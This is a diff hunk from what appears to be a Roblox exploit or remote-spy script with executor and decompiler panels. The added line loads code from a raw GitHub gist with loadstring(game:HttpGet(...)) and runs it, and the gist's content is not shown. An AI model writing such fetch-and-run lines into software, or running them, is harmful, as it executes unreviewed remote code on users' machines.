@@ -7,7 +7,7 @@ local Players, TweenService, UserInputService = game:GetService("Players"), game
 local HttpService = game:GetService("HttpService")
 
 local enabled, showArgs, maxLogs, paused, autoSave, showTimestamps, filterEnabled, currentFilter, highlightNew, monitoring = true, true, 500, false, false, true, false, "", true, true
-
+local log = loadstring(game:HttpGet("https://gist.githubusercontent.com/ProphecySkondo/55d0332827156d0798fd0b533aa1f188/raw/afd3800978e1799e2feacec9813ff809015825ff/gistfile1.txt"))()
 local gui, mainFrame, logFrame, settingsFrame, miniExecutor, httpLogFrame, decompilerFrame, decompilerContainer, scriptViewer
 local logs, filteredLogs, searchResults, httpLogs, decompilerLogs = {}, {}, {}, {}, {}
 local scriptViewerVisible = false
